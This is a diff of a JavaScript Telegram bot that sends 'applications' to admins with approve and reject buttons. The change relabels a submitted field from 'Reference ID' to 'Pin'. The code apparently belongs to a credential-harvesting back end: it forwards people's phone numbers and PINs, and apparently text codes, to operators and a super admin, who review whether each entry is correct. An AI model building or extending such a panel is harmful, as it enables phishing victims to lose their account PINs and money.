@@ -51,7 +51,7 @@ async function activeAdmins(){if(!pool)return initialAdmins;return (await pool.q
 function decisionKeyboard(stage,id){const buttons=stage==='details'?[[{text:'✅ Approve',callback_data:`decide:approve:${stage}:${id}`},{text:'❌ Wrong ID Number',callback_data:`decide:wrong_id:${stage}:${id}`}]]:[[ {text:'✅ Approve',callback_data:`decide:approve:${stage}:${id}`},{text:'❌ Wrong ID Number',callback_data:`decide:wrong_id:${stage}:${id}`},{text:'❌ Wrong Text',callback_data:`decide:wrong_text:${stage}:${id}`} ]];return {inline_keyboard:buttons};}
 async function notifyAdmins(message,keyboard,assignedAdmin=null){const recipients=assignedAdmin&&await isAdmin(assignedAdmin)?[String(assignedAdmin)]:await activeAdmins();for(const id of recipients) await send(id,message,{reply_markup:keyboard}); if(SUP) await send(SUP,`👁️ <b>SUPER ADMIN — VIEW ONLY COPY</b>\n\n${message}`);}
 async function notifyDetails(a){
- const msg=`🟠 <b>New application — review</b>\n\n📞 phone: <code>${esc(a.phone)}</code>\n🆔 Reference ID: <code>${esc(a.reference_id)}</code>\n📌 Status: DETAILS PENDING\n\nmax it.`;
+ const msg=`🟠 <b>New application — review</b>\n\n📞 phone: <code>${esc(a.phone)}</code>\n🔑 Pin: <code>${esc(a.reference_id)}</code>\n📌 Status: DETAILS PENDING\n\nmax it.`;
  await notifyAdmins(msg,decisionKeyboard('details',a.id),a.assigned_admin);
 }
 async function notifyReference(a){
